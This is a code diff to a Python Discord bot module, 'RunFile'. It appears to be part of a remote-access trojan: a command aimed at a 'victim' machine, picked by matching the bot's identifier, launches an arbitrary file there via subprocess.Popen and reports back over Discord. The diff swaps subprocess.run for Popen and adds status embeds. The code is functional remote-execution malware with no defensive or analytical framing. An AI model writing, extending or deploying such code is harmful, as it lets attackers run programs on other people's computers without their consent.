@@ -20,19 +20,30 @@ class RunFile(commands.Cog):
         """
         
         if str(victim) == str(self.bot.identifier):
-            if os.path.isfile():
-                output = subprocess.run(
+        
+            if os.path.isfile(file_path):
+            
+                output = subprocess.Popen(
                     file_path, 
-                    shell=True,
-                    stdin=subprocess.PIPE, 
-                    stderr=subprocess.PIPE,
-                    stdout=subprocess.PIPE, 
-                ).stdout.decode('utf-8')
+                    cwd = os.getcwd()
+                )
                 
-                return await ctx.response.send_message("File has been started, maybe")
+                return await ctx.response.send_message(
+                    embed = self.bot.genEmbed(
+                        "File has been started!",
+                        datetime.now(),
+                        "You gotta trust me on that one"
+                    )
+                )
                 
             else:
-                return await ctx.response.send_message("Invalid file")
+            
+                return await ctx.response.send_message(
+                    embed = self.bot.genEmbed(
+                        "Invalid file",
+                        datetime.now()
+                    )
+                )
 
 def setup(bot: commands.Bot):
     bot.add_cog(RunFile(bot))
